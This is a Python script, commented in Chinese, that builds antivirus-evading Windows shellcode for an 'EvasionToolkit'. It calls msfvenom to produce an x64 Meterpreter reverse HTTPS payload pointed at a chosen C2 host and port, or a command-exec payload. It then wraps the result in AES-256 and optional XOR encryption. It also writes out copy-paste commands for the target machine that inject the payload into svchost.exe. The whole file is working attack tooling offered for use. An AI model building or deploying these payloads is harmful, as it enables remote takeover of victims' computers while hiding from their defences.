"""
Shellcode Generator — 生成加密 shellcode 供 EvasionToolkit 使用

用法:
  python generate_payload.py --host 192.168.1.100 --port 4444
  python generate_payload.py --cmd "calc.exe"
  python generate_payload.py --file raw.bin  (直接使用原始 shellcode)
"""

import argparse
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import struct

def msfvenom_windows_reverse_https(lhost, lport):
    """使用 msfvenom 生成 x64 reverse HTTPS shellcode"""
    import subprocess
    cmd = [
        "msfvenom", "-p", "windows/x64/meterpreter/reverse_https",
        f"LHOST={lhost}", f"LPORT={lport}",
        "EXITFUNC=thread", "-f", "raw", "-o", "payload_stage1.bin"
    ]
    subprocess.run(cmd, check=True)
    with open("payload_stage1.bin", "rb") as f:
        return f.read()

def msfvenom_windows_exec(cmd):
    """执行命令的 shellcode"""
    import subprocess
    mcmd = [
        "msfvenom", "-p", "windows/x64/exec",
        f"CMD={cmd}", "EXITFUNC=thread", "-f", "raw", "-o", "payload_stage1.bin"
    ]
    subprocess.run(mcmd, check=True)
    with open("payload_stage1.bin", "rb") as f:
        return f.read()

def aes_encrypt(data):
    """AES-256-CBC 加密 shellcode"""
    key = os.urandom(32)  # 256-bit key
    iv = os.urandom(16)   # 128-bit IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted, key, iv

def xor_encrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def save_payload(filename, data, key, iv, xor_key=None):
    """保存加密后的 payload 和密钥"""
    os.makedirs("payload_output", exist_ok=True)

    # 保存加密 payload
    with open(f"payload_output/{filename}", "wb") as f:
        f.write(data)

    # 生成 C# 密钥数组
    key_csharp = "byte[] key = new byte[] { " + ", ".join(f"0x{b:X}" for b in key) + " };"
    iv_csharp = "byte[] iv = new byte[] { " + ", ".join(f"0x{b:X}" for b in iv) + " };"

    # 生成 PS 密钥数组
    key_ps = "$key = [byte[]]@(" + ", ".join(f"0x{b:X}" for b in key) + ")"
    iv_ps = "$iv = [byte[]]@(" + ", ".join(f"0x{b:X}" for b in iv) + ")"

    key_hex = key.hex().upper()
    iv_hex = iv.hex().upper()

    with open("payload_output/keys.txt", "w") as f:
        f.write("=== EvasionToolkit 命令 (复制粘贴到目标机) ===\n")
        f.write(f"EvasionToolkit.exe full payload_enc.bin \"C:\\Windows\\System32\\svchost.exe\" {key_hex} {iv_hex}\n\n")
        f.write(f"# 或 shellcode 模式:\n")
        f.write(f"EvasionToolkit.exe shellcode payload_enc.bin {key_hex} {iv_hex}\n\n")
        f.write("=== AES-256-CBC Keys ===\n")
        f.write(f"Key (hex): {key_hex}\n")
        f.write(f"IV  (hex): {iv_hex}\n\n")
        f.write(f"// C#\n{key_csharp}\n{iv_csharp}\n\n")
        f.write(f"# PowerShell\n{key_ps}\n{iv_ps}\n\n")

        if xor_key:
            xor_csharp = "byte[] xorKey = new byte[] { " + ", ".join(f"0x{b:X}" for b in xor_key) + " };"
            xor_ps = "$xorKey = [byte[]]@(" + ", ".join(f"0x{b:X}" for b in xor_key) + ")"
            f.write("=== XOR Key (Dual Encryption) ===\n")
            f.write(f"// C#\n{xor_csharp}\n\n")
            f.write(f"# PowerShell\n{xor_ps}\n")

    print(f"[+] Encrypted payload saved: payload_output/{filename}")
    print(f"[+] Keys saved: payload_output/keys.txt")
    print(f"\n{key_csharp}")
    print(iv_csharp)

def main():
    parser = argparse.ArgumentParser(description="AV Evasion Shellcode Generator")
    parser.add_argument("--host", help="C2 IP/Domain")
    parser.add_argument("--port", type=int, default=443, help="C2 Port")
    parser.add_argument("--cmd", help="Command to execute")
    parser.add_argument("--file", help="Use existing raw shellcode file")
    parser.add_argument("--dual", action="store_true", help="Apply AES+XOR dual encryption")
    parser.add_argument("--xor-key", default=None, help="XOR key (hex string, e.g. 'DEADBEEF')")

    args = parser.parse_args()

    # 获取原始 shellcode
    if args.file:
        with open(args.file, "rb") as f:
            sc = f.read()
        print(f"[*] Loaded raw shellcode: {len(sc)} bytes")
    elif args.cmd:
        sc = msfvenom_windows_exec(args.cmd)
        print(f"[*] Generated exec shellcode: {len(sc)} bytes")
    elif args.host:
        sc = msfvenom_windows_reverse_https(args.host, args.port)
        print(f"[*] Generated reverse HTTPS shellcode: {len(sc)} bytes")
    else:
        # Demo: simple calc shellcode
        sc = b"\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00"  # truncated placeholder
        print("[!] No payload specified — using demo placeholder")

    # AES 加密
    encrypted, aes_key, aes_iv = aes_encrypt(sc)
    print(f"[+] AES-256 encrypted: {len(sc)} → {len(encrypted)} bytes")

    xor_key = None
    if args.dual:
        if args.xor_key:
            xor_key = bytes.fromhex(args.xor_key)
        else:
            xor_key = os.urandom(16)
        encrypted = xor_encrypt(encrypted, xor_key)
        print(f"[+] XOR encrypted (dual layer) with key: {xor_key.hex().upper()}")

    save_payload("payload_enc.bin", encrypted, aes_key, aes_iv, xor_key)

if __name__ == "__main__":
    main()
